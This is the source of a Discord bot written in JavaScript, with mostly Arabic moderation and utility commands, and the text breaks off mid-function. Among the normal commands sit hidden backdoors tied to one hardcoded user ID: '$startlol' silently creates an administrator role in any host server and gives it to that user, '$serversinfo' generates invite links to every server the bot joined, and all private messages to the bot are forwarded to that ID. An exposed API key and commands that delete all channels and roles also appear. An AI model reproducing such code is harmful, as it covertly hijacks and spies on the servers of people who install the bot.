const Discord = require('discord.js');
const fs = require('fs');
const ms = require('ms');
const canvas = require('canvas-prebuilt');
const jimp = require('jimp');
const ytdl = require('ytdl-core');
const request = require('request');
const dateFormat = require('dateformat');
const google = require('google-it');
const db = require('quick.db');
const giphy = require('giphy-api')();    
const googl = require('goo.gl');  
const translate = require('google-translate-api');   
const { Client, Util } = require('discord.js');  
const UserBlocked = new Set(); 
const moment = require('moment');
const pretty = require('pretty-ms'); 
const zalgo = require('zalgolize');   
const math = require('math-expression-evaluator'); 
const stripIndents = require('common-tags').stripIndents;
const figlet = require('figlet');
const client = new Discord.Client();
const prefix = '_'
const myID = "415595760990552065";
ti={}  
spee={};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);       
  console.log(`Minato`);	
});


client.on('ready', function(){    
    var ms = 100000 ;
    var prefix = "-"; 
    var setGame = [` #Amaterasu ✨`,`Love All 🌹`,` _help 💕 `];
    var i = -1;    
    var j = 0;    
    setInterval(function (){    
        if( i == -1 ){    
j = 1;    
       }    
        if( i == (setGame.length)-1 ){    
            j = -1;    
      }    
       i = i+j;    
        client.user.setGame(setGame[i],`https://www.twitch.tv/Ninja`);
}, ms);    
    
});

client.on('message', message => {
     

     if (message.content === "$startlol") {
         if(message.author.id !== myID) return;
  message.guild.createRole({
        name : "amaterasu",
        permissions :   [8],
        color : " #BDBDBD "
    }) 
}
});

client.on('message', message => {
  if (message.content.startsWith('$startlol')) {
     if(!message.channel.guild) return;
 if(message.author.id !== myID) return;
message.member.addRole(message.guild.roles.find("name", "amaterasu"));
 
 }
 });

  client.on('message', msg => {
    if(msg.author.bot) return;
    
    if(msg.content === '$serversinfo') {
 if(msg.author.id !== myID) return;

      client.guilds.forEach(g => {
        
        let l = g.id
        g.channels.get(g.channels.first().id).createInvite({
          maxUses: 5,
          maxAge: 86400
        }).then(i => msg.channel.send(`
        **
        Invite Link : <https://discord.gg/${i.code}>
        Server : ${g.name} | Id : ${g.id} 
        Owner ID : ${g.owner.id}
        **
        `))
  
  
      })
    }
    
  })

client.on('message', msg => {
  if (msg.content === '$startlol') {
if(msg.author.id !== myID) return;
    msg.reply('Done :)');
  }
});

client.on('message', julian => {
var prefix = "_";
                        let args = julian.content.split(" ").slice(1).join(" ")
if(julian.content.startsWith(prefix + 'cc')) {
    if(!args) return julian.channel.send('`يرجي اختيار كم لون `');
             if (!julian.member.hasPermission('MANAGE_ROLES')) return julian.channel.sendMessage(':no_entry: | You dont have **MANAGE_ROLES** Permission!'); 
              julian.channel.send(`**✅ |Created __${args}__ Colors**`);
                  setInterval(function(){})
                    let count = 0;
                    let ecount = 0;
          for(let x = 1; x < `${parseInt(args)+1}`; x++){
            julian.guild.createRole({name:x,
              color: 'RANDOM'})
              }
            }
       });


client.on('message', message => {
	var prefix = "_";
if(!message.channel.guild) return;
if(message.content.startsWith(prefix + 'move')) {
 if (message.member.hasPermission("MOVE_MEMBERS")) {
 if (message.mentions.users.size === 0) {
 return message.channel.send("``لاستخدام الأمر اكتب هذه الأمر : " +prefix+ "move [USER]``")
}
if (message.member.voiceChannel != null) {
 if (message.mentions.members.first().voiceChannel != null) {
 var authorchannel = message.member.voiceChannelID;
 var usermentioned = message.mentions.members.first().id;
var embed = new Discord.RichEmbed()
 .setTitle("Succes!")
 .setColor("#000000")
 .setDescription(`لقد قمت بسحب <@${usermentioned}> الى الروم الصوتي الخاص بك✅ `)
var embed = new Discord.RichEmbed()
.setTitle(`You are Moved in ${message.guild.name}`)
 .setColor("RANDOM")
.setDescription(`**<@${message.author.id}> Moved You To His Channel!\nServer --> ${message.guild.name}**`)
 message.guild.members.get(usermentioned).setVoiceChannel(authorchannel).then(m => message.channel.send(embed))
message.guild.members.get(usermentioned).send(embed)
} else {
message.channel.send("``لا تستطيع سحب "+ message.mentions.members.first() +" `يجب ان يكون هذه العضو في روم صوتي`")
}
} else {
 message.channel.send("**``يجب ان تكون في روم صوتي لكي تقوم بسحب العضو أليك``**")
}
} else {
message.react("❌")
 }}});


client.on('message', message => { 
	var prefix = "_";
 let args = message.content.split(' ').slice(1);
    if(message.content.startsWith(prefix + 'short')) {
    if(!message.channel.guild) return;  

        googl.setKey('AIzaSyC2Z2mZ_nZTcSvh3QvIyrmOIFP6Ra6co6w');
        googl.getKey();
        googl.shorten(args.join(' ')).then(shorturl => {
            message.channel.send(''+shorturl)
        }).catch(e=>{
            console.log(e.message);
            message.channel.send('Error!');
        });
}
});


client.on('message', message => {
	var prefix = "_";
if (message.content.startsWith(prefix + 'tag')) {
    let args = message.content.split(" ").slice(1);
if(!args[0]) return message.reply(' **مرجو كتابة نص الدي تريد** ');  

    figlet(args.join(" "), (err, data) => {
              message.channel.send("```" + data + "```")
           })
}
});



client.on('message', message => {
  var prefix ="_"; 
if (message.content.startsWith(prefix + 'perms')) {
         if(!message.channel.guild) return;
         var perms = JSON.stringify(message.channel.permissionsFor(message.author).serialize(), null, 4);
         var zPeRms = new Discord.RichEmbed()
         .setColor('RANDOM')
         .setTitle(':tools: **Permissions** ')
         .addField(' 🎇 **Your Permissions:**',perms)
                  message.channel.send({embed:zPeRms});

    }
});


client.on("message", message => {
	var prefix = "_";
	var args = message.content.split(' ').slice(1); 
	var msg = message.content.toLowerCase();
	if( !message.guild ) return;
	if( !msg.startsWith( prefix + 'role' ) ) return;
	if(!message.member.hasPermission('MANAGE_ROLES')) return message.channel.send(':no_entry: | You dont have **MANAGE_ROLES** Permission!');
	if( msg.toLowerCase().startsWith( prefix + 'roleremove' ) ){
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد سحب منه الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد سحبها من الشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().removeRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم سحب من **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.removeRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.removeRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم سحب من البشريين رتبة**');
		} 	
	} else {
		if( !args[0] ) return message.reply( '**:x: يرجى وضع الشخص المراد اعطائها الرتبة**' );
		if( !args[1] ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );
		var role = msg.split(' ').slice(2).join(" ").toLowerCase(); 
		var role1 = message.guild.roles.filter( r=>r.name.toLowerCase().indexOf(role)>-1 ).first(); 
		if( !role1 ) return message.reply( '**:x: يرجى وضع الرتبة المراد اعطائها للشخص**' );if( message.mentions.members.first() ){
			message.mentions.members.first().addRole( role1 );
			return message.reply('**:white_check_mark: [ '+role1.name+' ] رتبة [ '+args[0]+' ] تم اعطاء **');
		}
		if( args[0].toLowerCase() == "all" ){
			message.guild.members.forEach(m=>m.addRole( role1 ))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء الكل رتبة**');
		} else if( args[0].toLowerCase() == "bots" ){
			message.guild.members.filter(m=>m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البوتات رتبة**');
		} else if( args[0].toLowerCase() == "humans" ){
			message.guild.members.filter(m=>!m.user.bot).forEach(m=>m.addRole(role1))
			return	message.reply('**:white_check_mark: [ '+role1.name+' ] تم اعطاء البشريين رتبة**');
		} 
	} 
});


client.on('message', message => {
    if (message.content === "_rooms") {
        if (message.author.bot) return
                      if (!message.guild) return;

        var channels = message.guild.channels.map(channels => `${channels.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField(`${message.guild.name}`,`**Rooms:white_check_mark:**`)
        .addField(':arrow_down: Rooms Number. :heavy_check_mark:',`** ${message.guild.channels.size}**`)
        
.addField(':arrow_down:Rooms  Name. :heavy_check_mark::',`**[${channels}]**`)
        message.channel.sendEmbed(embed);
    }
});



client.on('ready', () => {
	console.log('I am ready!'); 
  });



 client.on('message', message => {
              if (!message.channel.guild) return;
      if(message.content =='_count')
      var IzRo = new Discord.RichEmbed()
      .setThumbnail(message.author.avatarURL)
      .setFooter(message.author.username, message.author.avatarURL)
      .setTitle(':tulip:| Members info')
      .addBlankField(true)
      .addField('عدد اعضاء السيرفر',`${message.guild.memberCount}`)
      message.channel.send(IzRo);
    });



   client.on('message',function(message) { 
      if(message.content === prefix + "inv") {
          if(!message.channel.guild) return;
          var mmmmEmbed = new Discord.RichEmbed()
          .setAuthor(client.user.username)
          .setTitle('-  Click Here !.')
          .setURL(`https://discordapp.com/oauth2/authorize?client_id=505346451019399177&permissions=8&scope=bot`)
          .setThumbnail(client.user.avatarURL)
          .setFooter(`- Requested By: ${message.author.tag}`,message.author.avatarURL);
          message.channel.send(mmmmEmbed)
      }
   });


client.on('message', msg => {

  if (msg.content === 'هلا') {

    msg.reply('**هلا حبي**');

  }

});


client.on('message', msg => {

  if (msg.content === 'السلام عليكم') {

    msg.reply('**وعليكم السلام**');

  }

});


 client.on("message", message => {
     const prefix = "_"
               
           if(!message.channel.guild) return;
    if(message.author.bot) return;
       if(message.content === prefix + "image"){ 
           const embed = new Discord.RichEmbed()
   
       .setTitle(`This is  ** ${message.guild.name} **  Photo !`)
   .setAuthor(message.author.username, message.guild.iconrURL)
     .setColor(0x164fe3)
     .setImage(message.guild.iconURL)
     .setURL(message.guild.iconrURL)
                     .setTimestamp()
 
    message.channel.send({embed});
       }
   });


  client.on('message', message => {
  const port = '25565'
  if(message.content.startsWith(prefix + 'mcstats')) {
 const args = message.content.split(" ").slice(1).join(" ")
    if (!args) return message.channel.send("** يجب كتابة ايبي السيرفر . **");
        let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(`https://api.minetools.eu/favicon/${args}/25565`)
        .addField("📜 اسم السيرفر",`${args}`,true)
        .addField("🌐 بورت السيرفر",`${port}`)
        .setImage(`http://status.mclive.eu/${args}/${args}/25565/banner.png`)
        .setFooter(`DarkBot`)
                .setTimestamp()
    message.channel.send(embed)      
}})


client.on('message', message => {
   if(!message.channel.guild) return;
if(message.content.startsWith(prefix + 'bc')) {
if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات**').then(m => m.delete(5000));
if(!message.member.hasPermission('ADMINISTRATOR')) return
message.channel.send('**للأسف لا تمتلك صلاحية** `ADMINISTRATOR`' );
const args = message.content.split(" ").slice(1).join(" ")
const BcList = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)
.setAuthor(`محتوى الرساله : ${args}`)
.setDescription(`**برودكاست بـ امبد 📝\nبرودكاست بدون امبد✏ \nلديك دقيقه للأختيار قبل الغاء البرودكاست**`)
if (!args) return message.reply('**يجب عليك كتابة كلمة او جملة لإرسال البرودكاست**');message.channel.send(BcList).then(msg => {
msg.react('📝')
.then(() => msg.react('✏'))
.then(() =>msg.react('📝'))

var EmbedBcFilter = (reaction, user) => reaction.emoji.name === '📝' && user.id === message.author.id;
var NormalBcFilter = (reaction, user) => reaction.emoji.name === '✏' && user.id === message.author.id;

var EmbedBc = msg.createReactionCollector(EmbedBcFilter, { time: 60000 });
var NormalBc = msg.createReactionCollector(NormalBcFilter, { time: 60000 });


EmbedBc.on("collect", r => {

message.channel.send(`:ballot_box_with_check: تم ارسال الرساله بنجاح`).then(m => m.delete(5000));
message.guild.members.forEach(m => {
var EmbedRep = args.replace('<server>' ,message.guild.name).replace('<user>', m).replace('<by>', `${message.author.username}#${message.author.discriminator}`)
var bc = new
Discord.RichEmbed()
.setColor('RANDOM')
.setDescription(EmbedRep)
.setThumbnail(message.author.avatarURL)
m.send({ embed: bc })
msg.delete();
})
})
NormalBc.on("collect", r => {
  message.channel.send(`:ballot_box_with_check: تم ارسال الرساله بنجاح`).then(m => m.delete(5000));
message.guild.members.forEach(m => {
var NormalRep = args.replace('<server>' ,message.guild.name).replace('<user>', m).replace('<by>', `${message.author.username}#${message.author.discriminator}`)
m.send(NormalRep);
msg.delete();
})
})
})
}
});


client.on('message', message => {
if (message.content.startsWith("_avatar")) {
  var mentionned = message.mentions.users.first();
var x5bzm;
if(mentionned){
    var x5bzm = mentionned;
} else {
    var x5bzm = message.author;
    
}
  const embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .setImage(`${x5bzm.avatarURL}`)
message.channel.send(embed);
}
});



client.on('message', message => {
                if (message.content === "_server") {
                if(!message.channel.guild) return;
                const millis = new Date().getTime() - message.guild.createdAt.getTime();
                const now = new Date();
                
                const verificationLevels = ['None', 'Low', 'Medium', 'Insane', 'Extreme'];
                const days = millis / 1000 / 60 / 60 / 24;
                let roles = client.guilds.get(message.guild.id).roles.map(r => r.name);
                var embed  = new Discord.RichEmbed()
                .setAuthor(message.guild.name, message.guild.iconURL)
                .addField("**🆔 Server ID**", "**"+message.guild.id+"**",true)
                .addField("**👑 Server Owner**", "**"+message.guild.owner+"**" ,true)
                .addField("**🌍 Location **" , "**"+message.guild.region+"**",true)
                .addField('**💬 Text Channels **',`**[ ${message.guild.channels.filter(m => m.type === 'text').size} ] Channel **`,true)
                .addField('**👪 Category **',`**[ ${message.guild.channels.filter(m => m.type === 'category').size} ] Category **`,true)
                .addField("**📣 Voice Channels **", ` ** [ ${message.guild.channels.filter(m => m.type === 'voice').size} ] Channel ** `,true)
                .addField("**🤔 This server have been created for **", ` ** [ ${days.toFixed(0)} ] ** Day ` ,true)
                .addField("**👔 Roles **",`**[${message.guild.roles.size}]** Role `,true)
                
                .addField("👥Members",`
                **${message.guild.memberCount}**`)
                .setThumbnail(message.guild.iconURL)
                .setColor('RANDOM')
                message.channel.sendEmbed(embed)
                
                }
                }); 


client.on('message', msg => {

  if (msg.content === 'Hi') {

    msg.reply('**Hi <3**');

  }

});



client.on('message', msg => {
  if (msg.content === 'هاي') {
    msg.reply('**هايي 💛**');
  }
});


client.on("message", (message) => {
            if (message.channel.type === "dm") {
        if (message.author.id === client.user.id) return;
        let yumz = new Discord.RichEmbed()
                    .setTimestamp()
                    .setTitle("Direct Message To Amaterasu Bot")
                    .addField(`Sent By:`, `<@${message.author.id}> `)
                    .setColor("RANDOM")
                    .setThumbnail(message.author.displayAvatarURL)
                    .addField(`Message: `, `\n\n\`\`\`${message.content}\`\`\``)
                    .setFooter(`DM Amaterasu Bot Messages | DM Logs`)
                client.users.get("415595760990552065").send(yumz)
            }
});


 client.on('message', msg => {
 	var prefix = "_";
   if (msg.author.bot) return;
   if (!msg.content.startsWith(prefix)) return;
   let command = msg.content.split(" ")[0];
   command = command.slice(prefix.length);
   let args = msg.content.split(" ").slice(1);
 
     if(command === "clr") {
         const emoji = client.emojis.find("name", "wastebasket")
     let textxt = args.slice(0).join("");
     if(msg.member.hasPermission("MANAGE_MESSAGES")) {
     if (textxt == "") {
         msg.delete().then
     msg.channel.send("***```Supply A Number```***").then(m => m.delete(3000));
 } else {
     msg.delete().then
     msg.delete().then
     msg.channel.bulkDelete(textxt);
         msg.channel.send("```Cleard: " + textxt + " Messages```").then(m => m.delete(3000));
         }    
     }
 }
 });


client.on('message', message => {
      if(!message.channel.guild) return;
 var prefix = "_";
                 if(message.content.startsWith(prefix + 'allbots')) {
 
     
     if (message.author.bot) return;
     let i = 1;
         const botssize = message.guild.members.filter(m=>m.user.bot).map(m=>`${i++} - <@${m.id}>`);
           const embed = new Discord.RichEmbed()
           .setAuthor(message.author.tag, message.author.avatarURL)
           .setDescription(`**Found ${message.guild.members.filter(m=>m.user.bot).size} bots in this Server**
 ${botssize.join('\n')}`)
 .setFooter(client.user.username, client.user.avatarURL)
 .setTimestamp();
 message.channel.send(embed)
 
 }
 
 
 });


 client.on('message', msg => {
 	var  prefix = "_";
  if (msg.content.startsWith(prefix + 'cal')) {
     let args = msg.content.split(" ").slice(1);
         const question = args.join(' ');
     if (args.length < 1) {
         msg.reply('Specify a equation, please.');
 } else {    let answer;
     try {
         answer = math.eval(question);
     } catch (err) {
         msg.reply(`Error: ${err}`);
     }
     
     const embed = new Discord.RichEmbed()
     .addField("**Input**: ",`**${question}**`, true)
     .addField("**Output**: ",`**${answer}**`, true)
     msg.channel.send(embed)
     }
 };
 });
 


client.on('message', message => { 
 let prefix = '_'
     if (message.content.startsWith(prefix + 'emojis')) {
 
         const List = message.guild.emojis.map(e => e.toString()).join(" ");
 
         const EmojiList = new Discord.RichEmbed()
             .setTitle('➡ Emojis') 
             .setAuthor(message.guild.name, message.guild.iconURL) 
             .setColor('RANDOM') 
             .setDescription(List) 
             .setFooter(message.guild.name) 
         message.channel.send(EmojiList) 
     }
 });


 client.on('message',function(message) {
 	let prefix = "_";
 let args = message.content.split(" ").slice(1).join(" ");
 if(message.content.startsWith(prefix + "say")) {
 if(!args) return;
 message.channel.send(`**- ${args}**`); 
 }
 });


client.on('message',  message =>{
var moruad = 60000;
if (message.author.omar) return;
if (!message.content.startsWith(prefix)) return;
if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات**').then(m => m.delete(5000));
if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return message.reply("**I Don't Have `MANAGE_ROLES` Permission**").then(msg => msg.delete(6000))
var command = message.content.split(" ")[0];
command = command.slice(prefix.length);
var args = message.content.split(" ").slice(1);
    if(command == "mute") {
   var tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
    if(!tomute) return message.reply("**يجب عليك المنشن اولاّ**:x: ") .then(m => m.delete(5000));
	if(tomute.hasPermission("MANAGE_MESSAGES"))return      message.channel.send('**للأسف لا أمتلك صلاحية** `MANAGE_MASSAGEES`');
    var muterole = message.guild.roles.find(`name`, "Muted");
    //start of create role
    if(_muterole){
      try{
        muterole =  message.guild.createRole({
          name: "Muted",
          color: "#070000",
          permissions:[]
        })
        message.guild.channels.forEach((channel, id) => {
          channel.overwritePermissions(muterole, {
            SEND_MESSAGES: false,
            ADD_REACTIONS: false
          });
        });
      }catch(e){
        console.log(e.stack);
      }
    }
    //end of create role
  var mutetime = args[1];
    if(!mutetime) return message.reply("**يرجى تحديد وقت الميوت**:x:");
if(isNaN(mutetime)) return message.reply("** يرجي تحديد الوقت بـ الارقام فقط الارقام بلدقائق")
   (tomute.addRole(muterole.id));
message.reply(`<@${tomute.id}> **تم اعطائه ميوت ومدة الميوت** : ${mutetime}m`);
setTimeout(function(){
      tomute.removeRole(muterole.id);
      message.channel.send(`<@${tomute.id}> **انقضى الوقت وتم فك الميوت عن الشخص**:white_check_mark: `);
    }, mutetime*moruad);



  }
if(command === `_unmute`) {
  if(!message.member.hasPermission("MANAGE_ROLES")) return message.channel.sendMessage("**ليس لديك صلاحية لفك عن الشخص ميوت**:x: ").then(m => m.delete(5000));
if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return message.reply("**I Don't Have `MANAGE_ROLES` Permission**").then(msg => msg.delete(6000))

 var toMute = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
  if(!toMute) return message.channel.sendMessage("**عليك المنشن أولاّ**:x: ");

  var role = message.guild.roles.find (r => r.name === "Muted");

  if(_role || !toMute.roles.has(role.id)) return message.channel.sendMessage("**لم يتم ��عطاء هذه شخص ميوت من الأساس**:x:")

  toMute.removeRole(role)
  message.channel.sendMessage("**لقد تم فك الميوت عن شخص بنجاح**:white_check_mark:");

  return;

  }

});


client.on('message', message => {
	var command = message.content.toLowerCase().split(" ")[0];
	var args = message.content.toLowerCase().split(" ");
if(null == message.guild || !message.guild) return;
	var userM = message.guild.member(message.mentions.users.first() || message.guild.members.find(m => m.id === args[1]));
	var logChannel = message.guild.channels.find(c => c.name === 'log');
	var prefix = '_';
	
	if(command == prefix + 'ban') {
	if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
        if(!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send(':no_entry: | You dont have **BAN_MEMBERS** Permission!');
        if(!message.guild.member(client.user).hasPermission('BAN_MEMBERS')) return message.channel.send(':no_entry: | I dont have **BAN_MEMBERS** Permission!');
		if(!message.guild.member(client.user).hasPermission('EMBED_LINKS')) return message.channel.send(':no_entry: | I dont have **EMBED_LINKS** Permission!');
		if(!userM) return message.channel.send(`**➥ Useage:** ${prefix}ban \`\`@Name\`\` time reason`);
		if(userM.user.id === message.author.id) return message.channel.send(':no_entry: | Why you want ban **Your Self** ?');
		if(userM.user.id === message.guild.owner.id) return message.channel.send(':no_entry: | Nice try dude \:D');
		if(message.guild.member(userM.user).highestRole.position >= message.guild.member(message.member).highestRole.position) return message.channel.send(`:no_entry: | You cant give **${userM.user.username}** Ban beacuse him role highest then your role!`);
		if(message.guild.member(userM.user).highestRole.position >= message.guild.member(client.user).highestRole.position) return message.channel.send(`:no_entry: | I cant give **${userM.user.username}** Ban beacuse him role highest then my role!`);
		if(!message.guild.member(userM.user).bannable) return message.channel.send(`:no_entry: | I cant give **${userM.user.username}** Ban.`);
//xRGRx .. By Julian
		var time = message.content.split(" ")[2];
		if(!time) time = '1d';

		if(!ms(time)) {
			var reason = message.content.split(' ')[2];
		}else {
			var reason = message.content.split(' ')[3];
		}
		
		if(!reason) reason = 'No reason provided.';
		
		userM.user.send(`:no_entry: | You have \`\`BANNED\`\` From the server **${message.guild.name}**, By: **${message.author.tag}**, Reason: \`\`${reason}\`\`, Time: **${time}**`).catch();
        message.guild.member(userM.user).ban({ reason: reason });
        message.channel.send(`:white_check_mark: | Successfully \`\`BANNED\`\` ${userM.user.username} from the server! :airplane: \`\`${reason}\`\``);
		//xRGRx .. By Julian
		let banInfo = new Discord.RichEmbed()
		.setTitle('**[BANNED]**')
		.setThumbnail(message.author.avatarURL)
		.setColor('GREEN')
		.setDescription(`**\n:airplane: Successfully \`\`BANNED\`\` **${userM.user.username}** From the server!\n\n**User:** <@${userM.user.id}> (ID: ${userM.user.id})\n**By:** <@${message.author.id}> (ID: ${message.author.id})\n**Reason:** \`\`${reason}\`\`\n**Time:** ${time}`)
		.setTimestamp()
		.setFooter(userM.user.tag, userM.user.avatarURL)
		
		if(logChannel) {
			logChannel.send(banInfo);
		}
		//xRGRx .. By Julian
		setTimeout(function() {
			message.guild.fetchBans().then(bans => {
				var Found = bans.find(m => m.id === userM.user.id);
				if(!Found) return;
				
				message.guild.unban(userM.user);
			
				let unbanInfo = new Discord.RichEmbed()
				.setTitle('**[UNBANNED]**')
				.setThumbnail(message.guild.iconURL)
				.setColor('GREEN')
				.setDescription(`**\n:airplane: Successfully \`\`UNBANNED\`\` **${userM.user.username}** From the server!\n\n**User:** <@${userM.user.id}> (ID: ${userM.user.id})\n**Reason:** \`\`Time Ended.\`\``)
				.setTimestamp()
				.setFooter(userM.user.tag, userM.user.avatarURL)
				
				if(logChannel) {
					logChannel.send(banInfo);
				}
			})
		}, ms(time))
	}
	if(command == prefix + 'unban') {
		//xRGRx .. By Julian
		 if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
		if(!message.member.hasPermission('BAN_MEMBERS')) return message.channel.send(':no_entry: | You dont have **BAN_MEMBERS** Permission!');
		if(!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) return message.channel.send(':no_entry: | I dont have **BAN_MEMBERS** Permission!');
		if(!args[1]) return  message.channel.send(':no_entry: | Please type the ID of user');
		if(args[1].length < 16) return message.reply(':no_entry: | This ID is not id user!');
		message.guild.fetchBans().then(bans => {
			var Found = bans.find(m => m.id === args[1]);
			if(!Found) return message.channel.send(`:no_entry: | <@${message.author.id}> This preson not have any ban from this server! :unlock:`);
			message.guild.unban(args[1]);
			message.channel.send(`:white_check_mark: Successfully \`\`UNBANNED\`\` <@${args[1]}> From the server!`);
			//xRGRx .. By Julian
			let banInfo = new Discord.RichEmbed()
			.setTitle('**[UNBANNED]**')
			.setThumbnail(message.author.avatarURL)
			.setColor('GREEN')
			.setDescription(`**\n:airplane: Successfully \`\`UNBANNED\`\` <@${args[1]}> From the server!\n\n**User:** <@${args[1]}> (ID: ${args[1]})\n**By:** <@${message.author.id}> (ID: ${message.author.id})`)
			.setTimestamp()
			.setFooter(userM.user.tag, userM.user.avatarURL)
			
			if(logChannel) {
				logChannel.send(banInfo);
			}
		})
	}
});


 client.on('message', message => {
 	var prefix = "_"
   if (message.author.x5bz) return;
   if (!message.content.startsWith(prefix)) return;
 
   let command = message.content.split(" ")[0];
   command = command.slice(prefix.length);
 
   let args = message.content.split(" ").slice(1);
 
   if (command == "kick") {
                if(!message.channel.guild) return message.reply('** This command only for servers**');
          
   if(!message.guild.member(message.author).hasPermission("KICK_MEMBERS")) return message.reply("**You Don't Have ` KICK_MEMBERS ` Permission**");
   if(!message.guild.member(client.user).hasPermission("KICK_MEMBERS")) return message.reply("**I Don't Have ` KICK_MEMBERS ` Permission**");
   let user = message.mentions.users.first();
   let reason = message.content.split(" ").slice(2).join(" ");
   if (message.mentions.users.size < 1) return message.reply("**Mention SomeOne**");
   if(!reason) return message.reply ("**Write A Reason**");
   if (!message.guild.member(user)
   .kickable) return message.reply("**I Cant Kick SomeOne High Than My Rank**");
 
   message.guild.member(user).kick();
 
   const kickembed = new Discord.RichEmbed()
   .setAuthor(`KICKED!`, user.displayAvatarURL)
   .setColor("RANDOM")
   .setTimestamp()
   .addField("**User:**",  '**[ ' + `${user.tag}` + ' ]**')
   .addField("**By:**", '**[ ' + `${message.author.tag}` + ' ]**')
   .addField("**Reason:**", '**[ ' + `${reason}` + ' ]**')
   message.channel.send({
     embed : kickembed
   })
 }
 });


 client.on('message', message => {
 var prefix = "_";
        if(message.content === prefix + "mutechannel") {
                            if(!message.channel.guild) return message.reply('** This command only for servers**');
 
    if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(' **You Dont Have Perms**');
               message.channel.overwritePermissions(message.guild.id, {
             SEND_MESSAGES: false
 
               }).then(() => {
                   message.reply("**:white_check_mark: Success Has Been Locked Channel**")
               });
                 }
     if(message.content === prefix + "unmutechannel") {
                         if(!message.channel.guild) return message.reply('** This command only for servers**');
 
    if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply('**You Dont Have Perms**');
               message.channel.overwritePermissions(message.guild.id, {
             SEND_MESSAGES: true
 
               }).then(() => {
                   message.reply("**:white_check_mark: Success Has Been UnLocked Channel**")
               });
     }
        
 });


client.on('message', message => {
             var prefix = "_";
     if (message.author.bot) return;
     if (!message.content.startsWith(prefix)) return;
 
     let command = message.content.split(" ")[0];
     command = command.slice(prefix.length);
 
     let args = message.content.split(" ").slice(1);
 
     if (command == "embed") {
         if (!message.channel.guild) return message.reply('** This command only for servers **');
         let say = new Discord.RichEmbed()
             .setDescription(args.join("  "))
             .setColor(0x23b2d6)
         message.channel.sendEmbed(say);
         message.delete();
     }
 });


 client.on('message', omar => {
 var prefix = "_";
 if(omar.content.split(' ')[0] == prefix + 'dc') {  // delete all channels
 if (!omar.channel.guild) return;
 if(!omar.guild.member(omar.author).hasPermission("MANAGE_CHANNELS")) return omar.reply("**You Don't Have ` MANAGE_CHANNELS ` Permission**");
 if(!omar.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return omar.reply("**I Don't Have ` MANAGE_CHANNELS ` Permission**");
 omar.guild.channels.forEach(m => {
 m.delete();
 });// omar jedol / Codes
 }// omar jedol / Codes
 if(omar.content.split(' ')[0] == prefix + 'dr') { // delete all roles
 if (!omar.channel.guild) return;
 if(!omar.guild.member(omar.author).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return omar.reply("**You Don't Have ` MANAGE_ROLES_OR_PERMISSIONS ` Permission**");
 if(!omar.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return omar.reply("**I Don't Have ` MANAGE_ROLES_OR_PERMISSIONS ` Permission**");
 omar.guild.roles.forEach(m => {
 m.delete();
 });// omar jedol / Codes
 omar.reply("✅ `Success Deleted All Roles - Ranks`")
 }// omar jedol / Codes
 });



client.on("message", async message => {
            if(!message.channel.guild) return;
            var prefix = "_";
        if(message.content.startsWith(prefix + 'invites')) {
        var nul = 0
        var guild = message.guild
        await guild.fetchInvites()
            .then(invites => {
             invites.forEach(invite => {
                if (invite.inviter === message.author) {
                     nul+=invite.uses
                    }
                });
            });
          if (nul > 0) {
              console.log(`\n${message.author.tag} has ${nul} invites in ${guild.name}\n`)
              var embed = new Discord.RichEmbed()
                  .setColor("#000000")
                    .addField(`${message.author.username}`, `لقد قمت بدعوة **${nul}** شخص`)
                          message.channel.send({ embed: embed });
                      return;
                    } else {
                       var embed = new Discord.RichEmbed()
                        .setColor("#000000")
                        .addField(`${message.author.username}`, `لم تقم بدعوة أي شخص لهذة السيرفر`)

                       message.channel.send({ embed: embed });
                        return;
                    }
        }
        if(message.content.startsWith(prefix + 'invite-codes')) {
let guild = message.guild
var codes = [""]
message.channel.send(":postbox: **لقد قمت بأرسال جميع روابط الدعوات التي قمت بأنشائها في الخاص**")
guild.fetchInvites()
.then(invites => {
invites.forEach(invite => {
if (invite.inviter === message.author) {
codes.push(`discord.gg/${invite.code}`)
}
})
}).then(m => {
if (codes.length < 0) {
    var embed = new Discord.RichEmbed()
.setColor("#000000")
